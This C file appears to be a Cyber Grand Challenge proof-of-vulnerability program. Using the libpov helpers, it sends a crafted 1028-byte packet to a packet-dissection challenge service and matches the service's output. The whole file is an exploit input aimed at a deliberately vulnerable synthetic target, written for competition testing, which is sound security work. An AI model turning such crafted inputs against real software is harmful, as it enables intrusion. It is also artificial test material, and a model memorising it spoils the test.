#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xbc\x94\x4d\x3d"
         "\xa8\x8f\x5e\xd2\x5a\x5a\xf4\x90\xec\x00\x00\x00\x34\x56\xc2\xba"
         "\x6d\xa3\x59\x7e\xbd\x62\x95\xb0\x83\x81\xad\x3e\x53\xfc\x80\xa2"
         "\x41\x36\x89\x4e\x82\x69\x53\x47\x49\x75\x85\xaf\x28\xef\xaa\xda"
         "\x3d\x79\xb3\x63\x15\x28\xa4\x18\x46\x9b\x9b\x5a\x29\x9e\xbe\x11"
         "\x4b\x59\x4a\x14\x88\x8d\x61\x47\xa7\xf6\x0c\x73\xcd\x9f\xc9\xf7"
         "\xca\x3c\x08\x11\x5b\xbc\x72\x30\xe5\xa5\x39\x72\x4f\x36\xe2\xff"
         "\x30\xae\x1f\xfb\x54\x0c\x10\x9e\xfd\x39\xe2\xc8\xbb\x28\x02\xf5"
         "\x96\xe5\x41\xaa\xfc\x60\x97\x2f\xd8\x35\x78\xc0\x37\x55\xc1\x60"
         "\x09\x27\x00\x4d\x3b\x9e\x53\x62\x04\x5e\x90\x02\x74\x56\xda\x59"
         "\xd3\x64\xf5\xfc\xc6\xb6\x17\x44\xfb\xeb\xd2\xae\x9d\x61\x6b\xa3"
         "\x66\xc8\xcf\x44\xea\x5b\x9f\x93\x99\x68\x12\xf4\x96\x91\x47\x57"
         "\xc4\xca\xde\xca\x80\x46\x68\x0c\x00\xde\x8d\x78\x89\x30\xb6\x20"
         "\xfa\xc6\xa9\x91\x83\xb1\xaf\x9d\x87\x70\xc4\x81\x7d\x46\x60\x33"
         "\x07\x65\x6b\x95\x0e\xfc\xc7\xe9\x04\x64\xe1\x22\xf8\x75\x97\x24"
         "\x26\x8d\xa0\xa6\x31\x0a\x54\x7e\x48\x3d\xd0\x2a\x71\x98\xc0\x53"
         "\xfe\xfa\x82\x08\x4f\xba\x4b\x21\x94\x6f\xba\xc7\x4e\x8c\xf4\x94"
         "\x52\x48\xd4\x42\x15\xa8\x1c\xc4\x94\x93\x21\xc0\x0d\xa9\xa0\x27"
         "\x86\x3e\xa9\xb5\x9f\x6b\x4a\x5a\x3b\xb9\x2d\x90\x10\x7d\x4e\xed"
         "\x90\xd5\x60\xfd\x39\x13\x64\x1c\xb5\xf2\xdb\x72\xd7\x7c\x9d\x0d"
         "\x3e\x88\x26\x6d\x01\x39\x56\x4e\x6a\x15\x41\xb9\xe8\xcc\x56\x7a"
         "\x35\x41\x1c\x70\x1b\x2d\x14\x49\x4b\x29\xb2\x07\x4d\x38\x2e\x12"
         "\xd1\xe7\x3f\xac\x97\x68\xe3\x61\x43\xf4\x6a\xed\x04\x1f\xa0\x46"
         "\xc6\xe3\x3d\x6f\xda\x12\x06\x1d\x27\xe2\x40\xa8\x05\x40\xac\xfd"
         "\x96\x18\xb5\x73\x93\x31\x1f\x35\x99\x11\x90\x78\x7d\x81\x39\xfb"
         "\x7c\xb7\xd8\xec\xa9\x7d\x0a\x3f\xf2\x28\x08\xbe\x79\xb4\xe2\x00"
         "\x02\x21\xde\xb9\x9b\x8c\xef\xf8\x0f\x26\xc6\x51\xf4\x6a\x2d\x61"
         "\x9a\xcf\x30\xab\xa7\x7d\x61\xfc\xe1\x73\xdc\x7f\x87\xe7\x16\x22"
         "\x5f\x64\x6e\xee\x72\x96\xfd\xf1\xc9\xd0\x60\x99\x08\x70\x39\x89"
         "\xbf\xf9\x9c\xca\x80\xea\x23\x27\xa8\xcc\x1b\x0a\x21\x40\xde\x88"
         "\x1c\xc2\x15\xf3\x1c\x6f\x4a\x80\x4a\x6e\x47\x5c\xbc\xad\x03\xcb"
         "\xfb\x05\x47\x0e\xfb\xee\xda\xe5\x4d\x7a\x0d\x3e\xfd\x90\x83\xe3"
         "\xae\xd2\x7f\xf0\xff\x60\x3b\x02\x7a\x66\xbf\x9d\x1c\xae\xc0\x5e"
         "\xfe\x50\x41\x2c\x78\x0e\x31\xc1\x35\x1f\x56\x37\x04\xdc\x4f\x65"
         "\x73\x5b\x11\xb1\xd9\x5e\x51\xc7\x35\xc8\x0c\xc0\x41\x5a\x76\x58"
         "\x11\x44\x38\x1b\x43\xe2\x12\x20\x92\x69\x54\xbb\xf6\xb5\x51\x10"
         "\x54\xfc\x07\xfc\x36\x12\x4d\xb7\xbb\x90\x6a\x19\x2d\xfd\x0d\x99"
         "\xcc\xc5\x7b\x15\xd0\x26\xc3\x25\xa7\xa4\x9b\xad\x72\x48\xb1\x66"
         "\x0f\xb4\xf1\xe3\xff\x52\x93\x1b\x34\x04\xa3\xcd\x5a\xd1\x51\x95"
         "\x22\x0f\xf2\x5f\xa3\x12\xf8\xcb\xa0\xe1\x1a\x46\xd2\x05\x66\x0f"
         "\xea\x2f\xbc\x11\x6c\x43\xbe\xc1\xec\x85\xb6\x65\x03\x6a\x62\x4d"
         "\x03\xa1\xbf\x7e\x8b\x0c\xf7\x90\x3e\xbc\x14\x53\xeb\xc3\x4c\x7e"
         "\xb7\xce\x1c\x6e\xa3\xca\x78\xba\x3d\x18\x61\xc5\x3d\xbd\x16\x00"
         "\x4a\xd4\x39\xa8\x86\xff\x80\xa1\x6a\xb6\x49\x63\xc2\x9a\x51\x1e"
         "\x49\xef\x90\x59\x51\xdc\xca\x63\x51\x7d\x27\xec\x7a\x82\xf4\x96"
         "\x5f\x19\x71\x36\x69\xaf\x58\x70\xee\x78\x98\xb9\x46\x1a\xb0\x13"
         "\xc3\xb2\x8f\x4e\x85\x24\x41\xa4\x48\x29\x2b\x6a\x3c\x27\x47\x49"
         "\x88\xf3\x50\x6e\x67\x43\x70\xc1\xd6\xcb\xb7\xf3\x51\xa0\x01\x7d"
         "\x40\xbf\xde\x21\xf7\xcd\x1a\x00\xf0\xa8\x0d\xec\x4f\xdc\x87\x38"
         "\x8f\x56\xd9\xd2\xc9\x45\x13\x6a\x2b\xd8\x6c\x22\x5e\x2c\x3c\x07"
         "\x8b\xd6\x74\xdd\x3e\x76\xcb\x3c\xf9\x1a\x00\x5c\xea\xe9\xd9\xeb"
         "\x72\x6b\x5a\x68\x8e\x24\x87\xe0\x34\x61\x9a\x72\x67\x54\xfa\x3c"
         "\xfe\x89\x90\x6b\x90\xbf\xbf\x9d\x56\x79\x97\xfe\x3e\xc0\xd0\x30"
         "\xd1\x6d\xbe\x91\x4b\x1b\xd0\x91\x17\x53\x5b\xb0\xd7\x7f\x67\x9c"
         "\x1f\xd3\x09\x63\xbb\xa7\xed\x0b\x04\x2d\x43\xa6\x36\xad\x7e\x4d"
         "\x4d\xe8\xb3\x2c\xdc\x7b\xd1\xec\xc1\x09\xa7\x70\x91\x00\x80\x59"
         "\xd6\x3b\x33\x1d\xc8\x4b\xc3\x02\x8f\x1b\xad\xf7\x26\x70\xe3\xab"
         "\xe9\x27\x72\xdc\x25\xef\x7f\xa7\x9a\x29\x12\x05\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===shellycoatcallousness
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x73\x68\x65\x6c\x6c\x79\x63\x6f\x61\x74\x63"
         "\x61\x6c\x6c\x6f\x75\x73\x6e\x65\x73\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
